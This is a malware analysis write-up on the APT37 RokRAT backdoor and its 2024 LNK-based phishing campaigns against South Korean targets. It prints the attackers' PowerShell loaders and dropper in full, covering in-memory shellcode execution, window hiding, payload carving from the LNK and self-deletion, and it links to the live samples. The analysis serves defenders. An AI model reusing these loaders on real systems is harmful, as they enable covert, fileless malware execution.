# ROKRAT

RokRAT is a custom-written backdoor associated with the threat group APT37 and it's name stands for Republic of Korea RAT. RokRAT is a fully-featured backdoor complete with a comprehensive set of features that empower its operators to perform efficient surveillance on the targets, in particular South Korean entities.

In order to deploy the backdoor onto the victim machine, APT37 utilizes spear-phishing emails with attached a zip file, containing PDF, HWP and .LNK files that act as decoy PDF documents, hiding powershell commands executed under the radar.

![GJeuN1LbsAANISQ](https://github.com/S4ndW4lker/APT/assets/163764116/af07a34f-531e-4653-83bb-aa0e50e90574)

(Phishing email example)

The following samples analyzed are some of the files distributed in the campaigns from February to March 2024.

## 북한지 기고문 (1).zip

In the first campaign conducted in February 2024, the file [북한지 기고문 (1).zip](https://www.virustotal.com/gui/file/e914f39c7800f87e99ca4821c7a6d4ac580d99b5d70bea54d17c2b6e862b2de6) (Contribution to North Korea (1).zip) was distributed via phishing emails. It contained several decoy documents and the actual .LNK malware: [이상용.lnk](https://www.virustotal.com/gui/file/cbc777d1e018832790482e6fd82ab186ac02036c231f10064b14ff1d81832f13/detection) (Lee Sang-yong.lnk), used as a loader of the ROKRAT backdoor in memory (file-less). It gets the shellcode content contained in the public.dat file and loads it into the memory, allocated with GlobalAlloc, byte-per-byte using the for loop and the WriteByte function. The ROKRAT shellcode is then executed with CreateThread function.

```ps1
$exePath= $env:public+'\'+'public.dat';
$exeFile = Get-Content -path $exePath -encoding byte;
[Net.ServicePointManager]::SecurityProtocol = [Enum]::ToObject([Net.SecurityProtocolType], 3072);
$kernel32 = [System.Text.Encoding]::UTF8.GetString(34) + 'kernel32.dll' + [System.Text.Encoding]::UTF8.GetString(34);
$GlobalAlloc = '[DllImport(' + $kernel32 + ')]public static extern IntPtr GlobalAlloc(uint b,uint c);';
$b = Add-Type -MemberDefinition $GlobalAlloc  -Name 'AAA' -PassThru;
$VirtualProtect = '[DllImport(' + $kernel32 + ')]public static extern bool VirtualProtect(IntPtr a,uint b,uint c,out IntPtr d);';
$a90234sb = Add-Type -MemberDefinition $VirtualProtect -Name 'AAB' -PassThru;
$CreateThread = '[DllImport(' + $kernel32 + ')]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);';
$cake3sd23 = Add-Type -MemberDefinition $CreateThread  -Name 'BBB' -PassThru;
$dtts9s03sd23 = '[DllImport(' + $kernel32 + ')]public static extern IntPtr WaitForSingleObject(IntPtr a,uint b);';
$fried3sd23 = Add-Type -MemberDefinition $dtts9s03sd23 -Name 'DDD' -PassThru;
$byteCount = $exeFile.Length;
$buffer = $b::GlobalAlloc(0x0040, $byteCount + 0x100);
$old = 0;
$a90234sb::VirtualProtect($buffer, $byteCount + 0x100, 0x40, [ref]$old);
for($i = 0; $i -lt $byteCount; $i++) { 
    [System.Runtime.InteropServices.Marshal]::WriteByte($buffer, $i, $exeFile[$i]);
};
$handle = $cake3sd23::CreateThread(0, 0, $buffer, 0, 0, 0);
$fried3sd23::WaitForSingleObject($handle, 500 * 1000);
start /min C:\Windows\SysWow64\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden "$stringPath=$env:temp+'\'+'temp.dat'; 
$stringByte = Get-Content -path $stringPath -encoding byte;
$string = [System.Text.Encoding]::UTF8.GetString($stringByte);
$scriptBlock = [scriptblock]::Create($string);
&$scriptBlock;"
```

([link](https://bazaar.abuse.ch/sample/cbc777d1e018832790482e6fd82ab186ac02036c231f10064b14ff1d81832f13/) to the 이상용.lnk sample on Malware Bazaar)

## (안보칼럼) 반국가세력에 안보기관이 무기력해서는 안된다.zip

In a second campaign conducted in February and reported on [PlainBit](https://blog.plainbit.co.kr/lnk_rokrat/) the TTPs adoped where nearly the same, the only thing to point out is the use of powershell commands inside the **(안보칼럼) 반국가세력에 안보기관이 무기력해서는 안된다.lnk** file to create the files: public.dat, temp.dat and working.bat, written with the content carried inside the same .lnk file and meticulously divided into offset units as follows.

![memory-offset-units](https://github.com/S4ndW4lker/APT/assets/163764116/541cdc33-4bbc-4bb5-9bc8-6a5e19519d7f)

The cmd command executed:

```cmd
%windir%\SysWOW64\cmd.exe /k for /f "tokens=*" %a in ('dir C:\Windows\SysWow64\WindowsPowerShell\v1.0\*rshell.exe /s /b /od') do call %a "

$t1 = 'user32.dll';
$t = 'using System; 
using System.Runtime.InteropServices; 
public class User32 {
[DllImport(' + [System.Text.Encoding]::UTF8.GetString(34) + $t1 + [System.Text.Encoding]::UTF8.GetString(34) + ', SetLastError = true)]
public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
[DllImport(' + [System.Text.Encoding]::UTF8.GetString(34) + $t1 + [System.Text.Encoding]::UTF8.GetString(34) + ')] 
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}'; 

Add-Type -TypeDefinition $t;
$proName = 'powershell.exe'; 
$cmdMainWindowHandle = [User32]::FindWindow([NullString]::Value, $proName);[User32]::ShowWindow($cmdMainWindowHandle, 0);

$dirPath = Get-Location; 
if($dirPath -Match 'System32' -or $dirPath -Match 'Program Files') {$dirPath = '%temp%'}; 

$lnkPath = Get-ChildItem -Path $dirPath -Recurse *.lnk | where-object {$_.length -eq 0x0DD6DA21} | Select-Object -ExpandProperty FullName;
$lnkFile=New-Object System.IO.FileStream($lnkPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read);
$lnkFile.Seek(0x0000162E, [System.IO.SeekOrigin]::Begin);
$pdfFile=New-Object byte[] 0x00042C00;
$lnkFile.Read($pdfFile, 0, 0x00042C00);
$pdfPath = $lnkPath.replace('.lnk','.hwp');
sc $pdfPath $pdfFile -Encoding Byte;& $pdfPath;

$lnkFile.Seek(0x0004422E,[System.IO.SeekOrigin]::Begin);
$exeFile=New-Object byte[] 0x000D9402;
$lnkFile.Read($exeFile, 0, 0x000D9402);
$exePath=$env:public+'\'+'public.dat';
sc $exePath $exeFile -Encoding Byte;

$lnkFile.Seek(0x0011D630,[System.IO.SeekOrigin]::Begin);
$stringByte = New-Object byte[] 0x000005AA;
$lnkFile.Read($stringByte, 0, 0x000005AA);
$batStrPath = $env:temp+'\'+'temp.dat';
$string = [System.Text.Encoding]::UTF8.GetString($stringByte);
$string | Out-File -FilePath $batStrPath -Encoding ascii;

$lnkFile.Seek(0x0011DBDA,[System.IO.SeekOrigin]::Begin);
$batByte = New-Object byte[] 0x00000135;
$lnkFile.Read($batByte, 0, 0x00000135);
$executePath = $env:temp+'\'+'working.bat';
Write-Host $executePath;
Write-Host $batStrPath;
$bastString = [System.Text.Encoding]::UTF8.GetString($batByte);
$bastString | Out-File -FilePath $executePath -Encoding ascii;& $executePath;

$lnkFile.Close();
remove-item -path $lnkPath -force;"&& exit
```

The powershell script isolated:

```ps1
# cmd 실행 창 숨기기
# Hide cmd run window
$t1 = 'user32.dll';
$t = 'using System; 
using System.Runtime.InteropServices; 
public class User32 {
    [DllImport(' + [System.Text.Encoding]::UTF8.GetString(34) + $t1 + [System.Text.Encoding]::UTF8.GetString(34) + ', SetLastError = true)]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
    [DllImport(' + [System.Text.Encoding]::UTF8.GetString(34) + $t1 + [System.Text.Encoding]::UTF8.GetString(34) + ')] 
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}'; 

Add-Type -TypeDefinition $t;
$proName = 'powershell.exe'; 
$cmdMainWindowHandle = [User32]::FindWindow([NullString]::Value, $proName);[User32]::ShowWindow($cmdMainWindowHandle, 0);

# 현재 위치가 'System32'거나 'Program Files' 하위이면 '%temp%'로 변경
# If the current location is under ‘System32’ or ‘Program Files’, change it to ‘%temp%’
$dirPath = Get-Location; 
if($dirPath -Match 'System32' -or $dirPath -Match 'Program Files') {$dirPath = '%temp%'}; 

# LNK 데이터를 분할하여 HWP 파일 생성 및 실행
# Split LNK data to create and run HWP file
$lnkPath = Get-ChildItem -Path $dirPath -Recurse *.lnk | where-object {$_.length -eq 0x0DD6DA21} | Select-Object -ExpandProperty FullName;
$lnkFile=New-Object System.IO.FileStream($lnkPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read);
$lnkFile.Seek(0x0000162E, [System.IO.SeekOrigin]::Begin);
$pdfFile=New-Object byte[] 0x00042C00;
$lnkFile.Read($pdfFile, 0, 0x00042C00);
$pdfPath = $lnkPath.replace('.lnk','.hwp');
sc $pdfPath $pdfFile -Encoding Byte;& $pdfPath;

# LNK 데이터를 분할하여 public.dat 파일 생성
# Split LNK data to create public.dat file
$lnkFile.Seek(0x0004422E,[System.IO.SeekOrigin]::Begin);
$exeFile=New-Object byte[] 0x000D9402;
$lnkFile.Read($exeFile, 0, 0x000D9402);
$exePath=$env:public+'\'+'public.dat';
sc $exePath $exeFile -Encoding Byte;

# LNK 데이터를 분할하여 temp.dat 파일 생성
# Split LNK data to create temp.dat file
$lnkFile.Seek(0x0011D630,[System.IO.SeekOrigin]::Begin);
$stringByte = New-Object byte[] 0x000005AA;
$lnkFile.Read($stringByte, 0, 0x000005AA);
$batStrPath = $env:temp+'\'+'temp.dat';
$string = [System.Text.Encoding]::UTF8.GetString($stringByte);
$string | Out-File -FilePath $batStrPath -Encoding ascii;

# LNK 데이터를 분할하여 working.bat 파일 생성 및 실행
# Split LNK data to create and run working.bat file
$lnkFile.Seek(0x0011DBDA,[System.IO.SeekOrigin]::Begin);
$batByte = New-Object byte[] 0x00000135;
$lnkFile.Read($batByte, 0, 0x00000135);
$executePath = $env:temp+'\'+'working.bat';
Write-Host $executePath;
Write-Host $batStrPath;
$bastString = [System.Text.Encoding]::UTF8.GetString($batByte);
$bastString | Out-File -FilePath $executePath -Encoding ascii;& $executePath;

# LNK 파일 자가 삭제
# Self-delete LNK files
$lnkFile.Close();
remove-item -path $lnkPath -force;
```
## 동북공정(미국의회조사국(CRS Report).zip

Nothing has changed in the infection chain of this last campaign analyzed in March:  phishing email -> 동북공정(미국의회조사국(CRS Report).zip file -> 동북공정(미국의회조사국(CRS Report).pdf.lnk loader -> **ROKRAT**

([link](https://bazaar.abuse.ch/sample/b1025baa59609708315326fe4279d8113f7af3f292470ef42c33fccbb8aa3e56/) to the 동북공정(미국의회조사국(CRS Report).pdf.lnk sample on Malware Bazaar)

```ps1
$exePath=$env:public+'\'+'panic.dat';
$exeFile = Get-Content -path $exePath -encoding byte;
[Net.ServicePointManager]::SecurityProtocol = [Enum]::ToObject([Net.SecurityProtocolType], 3072);
$k1123 = [System.Text.Encoding]::UTF8.GetString(34) + 'kernel32.dll' + [System.Text.Encoding]::UTF8.GetString(34);
$a90234s = '[DllImport(' + $k1123 + ')]public static extern IntPtr GlobalAlloc(uint b,uint c);';
$b = Add-Type -MemberDefinition $a90234s  -Name 'AAA' -PassThru;
$d3s9sdf = '[DllImport(' + $k1123 + ')]public static extern bool VirtualProtect(IntPtr a,uint b,uint c,out IntPtr d);';
$a90234sb = Add-Type -MemberDefinition $d3s9sdf -Name 'AAB' -PassThru;
$b3s9s03sfse = '[DllImport(' + $k1123 + ')]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);';
$cake3sd23 = Add-Type -MemberDefinition $b3s9s03sfse  -Name 'BBB' -PassThru;
$dtts9s03sd23 = '[DllImport(' + $k1123 + ')]public static extern IntPtr WaitForSingleObject(IntPtr a,uint b);';
$fried3sd23 = Add-Type -MemberDefinition $dtts9s03sd23 -Name 'DDD' -PassThru;
$byteCount = $exeFile.Length;
$buffer = $b::GlobalAlloc(0x0040, $byteCount + 0x100);
$old = 0;
$a90234sb::VirtualProtect($buffer, $byteCount + 0x100, 0x40, [ref]$old);

for($i = 0; $i -lt $byteCount; $i++) {
    [System.Runtime.InteropServices.Marshal]::WriteByte($buffer, $i, $exeFile[$i]);
 };
$handle = $cake3sd23::CreateThread(0, 0, $buffer, 0, 0, 0);
$fried3sd23::WaitForSingleObject($handle, 500 * 1000);

start /min C:\Windows\SysWow64\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden "$stringPath=$env:temp+'\'+'para.dat';
$stringByte = Get-Content -path $stringPath -encoding byte;
$string = [System.Text.Encoding]::UTF8.GetString($stringByte);
$scriptBlock = [scriptblock]::Create($string);
&$scriptBlock;"
```

## Resources

|Resources|
|---------|
|[RokRAT 악성코드를 유포하는 LNK 파일 (수료증 위장)](https://asec.ahnlab.com/ko/64423/)|
|[Genians' report (2024-03-27)](https://www.genians.co.kr/blog/threat_intelligence/webinar-apt)|
|[SentinelLabs's report (January 2024)](https://www.sentinelone.com/labs/a-glimpse-into-future-scarcruft-campaigns-attackers-gather-strategic-intelligence-and-target-cybersecurity-professionals/)|
|[Plainbit's report about (안보칼럼) 반국가세력에 안보기관이 무기력해서는 안된다.zip](https://blog.plainbit.co.kr/lnk_rokrat/)|
|[Virus Total graph](https://www.virustotal.com/graph/gd37ef280e73c42a9bc47faf14dfa977ad28044dcb83b48de80d07722f8a34bb5)|

